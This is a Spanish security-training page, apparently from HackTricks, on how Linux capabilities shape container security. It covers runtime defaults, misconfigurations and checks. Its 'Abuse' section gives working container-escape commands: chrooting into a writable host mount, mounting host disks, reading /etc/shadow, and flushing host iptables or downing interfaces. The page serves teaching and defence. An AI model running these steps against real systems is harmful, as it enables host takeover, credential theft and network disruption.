# Capacidades de Linux en Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Descripción general

Las capacidades de Linux son una de las piezas más importantes de la seguridad de los containers porque responden a una pregunta sutil pero fundamental: **¿qué significa realmente "root" dentro de un container?** En un sistema Linux normal, el UID 0 históricamente implicaba un conjunto de privilegios muy amplio. En los kernels modernos, ese privilegio se descompone en unidades más pequeñas llamadas capacidades. Un proceso puede ejecutarse como root y aun así carecer de muchas operaciones potentes si se han eliminado las capacidades relevantes.

Los containers dependen mucho de esta distinción. Muchas cargas de trabajo todavía se inician como UID 0 dentro del container por motivos de compatibilidad o simplicidad. Sin la eliminación de capacidades, esto sería demasiado peligroso. Con la eliminación de capacidades, un proceso root dentro de un container todavía puede realizar muchas tareas ordinarias dentro del container, mientras se le deniegan operaciones del kernel más sensibles. Por eso, que un shell del container muestre `uid=0(root)` no significa automáticamente "root del host" ni siquiera "privilegios amplios sobre el kernel". Los conjuntos de capacidades determinan cuánto vale realmente esa identidad root.

Para consultar la referencia completa de capacidades de Linux y muchos ejemplos de abuso, consulta:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Funcionamiento

Las capacidades se registran en varios conjuntos, incluidos los conjuntos permitted, effective, inheritable, ambient y bounding. Para muchas evaluaciones de containers, la semántica exacta del kernel de cada conjunto es menos importante inicialmente que la pregunta práctica final: **¿qué operaciones privilegiadas puede realizar correctamente este proceso ahora mismo y qué futuras ganancias de privilegios siguen siendo posibles?**

Esto es importante porque muchas técnicas de breakout son, en realidad, problemas de capacidades disfrazados de problemas de containers. Una carga de trabajo con `CAP_SYS_ADMIN` puede acceder a una enorme cantidad de funcionalidades del kernel que un proceso root normal de un container no debería tocar. Una carga de trabajo con `CAP_NET_ADMIN` se vuelve mucho más peligrosa si también comparte el network namespace del host. Una carga de trabajo con `CAP_SYS_PTRACE` se vuelve mucho más interesante si puede ver los procesos del host mediante el uso compartido del PID. En Docker o Podman esto puede aparecer como `--pid=host`; en Kubernetes normalmente aparece como `hostPID: true`.

En otras palabras, el conjunto de capacidades no se puede evaluar de forma aislada. Debe analizarse junto con los namespaces, seccomp y la política MAC.

## Lab

Una forma muy directa de inspeccionar las capacidades dentro de un container es:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
También puedes comparar un contenedor más restrictivo con uno al que se le hayan añadido todas las capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Para ver el efecto de una adición limitada, intenta eliminarlo todo y volver a añadir solo una capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Estos pequeños experimentos ayudan a demostrar que un runtime no se limita a alternar un booleano llamado "privileged". Está definiendo la superficie de privilegios real disponible para el proceso.

## Capabilities de alto riesgo

Aunque muchas capabilities pueden ser relevantes dependiendo del objetivo, algunas aparecen repetidamente en el análisis de escapes de contenedores.

**`CAP_SYS_ADMIN`** es la que los defensores deberían tratar con mayor sospecha. A menudo se describe como "the new root" porque desbloquea una enorme cantidad de funcionalidades, incluidas operaciones relacionadas con mounts, comportamientos sensibles a namespaces y muchas rutas del kernel que nunca deberían exponerse casualmente a contenedores. Si un contenedor tiene `CAP_SYS_ADMIN`, un seccomp débil y ningún confinamiento MAC sólido, muchas rutas clásicas de breakout se vuelven mucho más realistas.

**`CAP_SYS_PTRACE`** es relevante cuando existe visibilidad de procesos, especialmente si el PID namespace se comparte con el host o con workloads vecinos interesantes. Puede convertir la visibilidad en manipulación.

**`CAP_NET_ADMIN`** y **`CAP_NET_RAW`** son relevantes en entornos centrados en redes. En una bridge network aislada ya pueden ser peligrosas; en un host network namespace compartido son mucho peores, porque el workload podría reconfigurar la red del host, sniffear, suplantar o interferir con los flujos de tráfico locales.

**`CAP_SYS_MODULE`** suele ser catastrófica en un entorno rootful, porque cargar kernel modules equivale prácticamente a controlar el host kernel. Casi nunca debería aparecer en un workload de contenedor de propósito general.

## Uso del runtime

Docker, Podman, stacks basados en containerd y CRI-O utilizan controles de capabilities, pero sus defaults e interfaces de gestión difieren. Docker los expone directamente mediante flags como `--cap-drop` y `--cap-add`. Podman ofrece controles similares y con frecuencia se beneficia de la ejecución rootless como capa de seguridad adicional. Kubernetes expone la adición y eliminación de capabilities mediante el `securityContext` del Pod o del contenedor. Los entornos de system containers, como LXC/Incus, también dependen del control de capabilities, pero la integración más amplia con el host de esos sistemas suele tentar a los operadores a relajar los defaults más agresivamente que en un entorno de app containers.

El mismo principio se aplica a todos ellos: que una capability pueda concederse técnicamente no significa necesariamente que deba concederse. Muchos incidentes reales comienzan cuando un operador añade una capability simplemente porque un workload falló con una configuración más estricta y el equipo necesitaba una solución rápida.

## Misconfiguraciones

El error más evidente es **`--cap-add=ALL`** en CLIs de estilo Docker/Podman, pero no es el único. En la práctica, un problema más común es conceder una o dos capabilities extremadamente potentes, especialmente `CAP_SYS_ADMIN`, para "hacer que la aplicación funcione", sin comprender también las implicaciones de los namespaces, seccomp y mounts. Otro modo de fallo común es combinar capabilities adicionales con el uso compartido de namespaces del host. En Docker o Podman esto puede aparecer como `--pid=host`, `--network=host` o `--userns=host`; en Kubernetes, la exposición equivalente suele aparecer mediante opciones del workload como `hostPID: true` o `hostNetwork: true`. Cada una de esas combinaciones cambia lo que la capability puede afectar realmente.

También es común que los administradores crean que, como un workload no es completamente `--privileged`, sigue estando restringido de forma significativa. A veces es cierto, pero en ocasiones la postura efectiva ya está lo bastante cerca de privileged como para que la distinción deje de importar desde el punto de vista operativo.

## Abuse

El primer paso práctico es enumerar el conjunto efectivo de capabilities y probar inmediatamente las acciones específicas de cada capability que serían relevantes para un escape o para acceder a información del host:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Si `CAP_SYS_ADMIN` está presente, prueba primero el abuso basado en montajes y el acceso al sistema de archivos del host, porque este es uno de los facilitadores de escape más comunes:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Si `CAP_SYS_PTRACE` está presente y el contenedor puede ver procesos interesantes, verifica si la capacidad puede convertirse en inspección de procesos:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Si `CAP_NET_ADMIN` o `CAP_NET_RAW` está presente, comprueba si el workload puede manipular el network stack visible o, al menos, recopilar información útil sobre la red:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Cuando una prueba de capabilities tiene éxito, combínala con la situación de los namespaces. Una capability que parece meramente peligrosa en un namespace aislado puede convertirse inmediatamente en un escape o en una primitive de host-recon cuando el contenedor también comparte el PID del host, la red del host o los mounts del host.

### Ejemplo completo: `CAP_SYS_ADMIN` + Mount del host = Escape del host

Si el contenedor tiene `CAP_SYS_ADMIN` y un bind mount escribible del filesystem del host, como `/host`, la ruta de escape suele ser sencilla:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Si `chroot` tiene éxito, los comandos ahora se ejecutan en el contexto del sistema de archivos raíz del host:
```bash
id
hostname
cat /etc/shadow | head
```
Si `chroot` no está disponible, a menudo se puede lograr el mismo resultado llamando al binario a través del árbol montado:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Ejemplo completo: `CAP_SYS_ADMIN` + acceso a dispositivos

Si se expone un dispositivo de bloques del host, `CAP_SYS_ADMIN` puede convertirlo en acceso directo al sistema de archivos del host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Ejemplo completo: `CAP_NET_ADMIN` + Networking del Host

Esta combinación no siempre proporciona root del host directamente, pero puede reconfigurar por completo el stack de red del host:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Eso puede permitir una denegación de servicio, la interceptación del tráfico o el acceso a servicios que antes estaban filtrados.

## Comprobaciones

El objetivo de las comprobaciones de capabilities no es solo volcar valores sin procesar, sino comprender si el proceso tiene privilegios suficientes para que su situación actual de namespace y montajes resulte peligrosa.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Qué es interesante aquí:

- `capsh --print` es la forma más sencilla de detectar capabilities de alto riesgo como `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` o `cap_sys_module`.
- La línea `CapEff` en `/proc/self/status` indica qué capabilities son realmente efectivas en este momento, no solo cuáles podrían estar disponibles en otros conjuntos.
- Un volcado de capabilities adquiere mucha más importancia si el contenedor también comparte los namespaces de PID, red o usuario del host, o tiene montajes del host con permisos de escritura.

Después de recopilar la información sin procesar sobre las capabilities, el siguiente paso es interpretarla. Hay que comprobar si el proceso se ejecuta como root, si los user namespaces están activos, si se comparten namespaces del host, si seccomp está aplicando restricciones y si AppArmor o SELinux todavía restringen el proceso. Un conjunto de capabilities por sí solo es solo una parte de la situación, pero a menudo es la parte que explica por qué un container breakout funciona y otro falla con el mismo punto de partida aparente.

## Valores predeterminados del runtime

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual habitual |
| --- | --- | --- | --- |
| Docker Engine | Conjunto de capabilities reducido por defecto | Docker mantiene una lista predeterminada de capabilities permitidas y elimina el resto | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Conjunto de capabilities reducido por defecto | Los contenedores de Podman no tienen privilegios por defecto y utilizan un modelo de capabilities reducido | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Hereda los valores predeterminados del runtime salvo que se modifiquen | Si no se especifica `securityContext.capabilities`, el contenedor obtiene el conjunto de capabilities predeterminado del runtime | `securityContext.capabilities.add`, no usar `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O bajo Kubernetes | Normalmente, los valores predeterminados del runtime | El conjunto efectivo depende del runtime y de la especificación del Pod | igual que en la fila de Kubernetes; la configuración directa de OCI/CRI también puede añadir capabilities explícitamente |

En Kubernetes, el punto importante es que la API no define un único conjunto universal de capabilities predeterminado. Si el Pod no añade ni elimina capabilities, la carga de trabajo hereda el valor predeterminado del runtime para ese nodo.

{{#include ../../../../banners/hacktricks-training.md}}
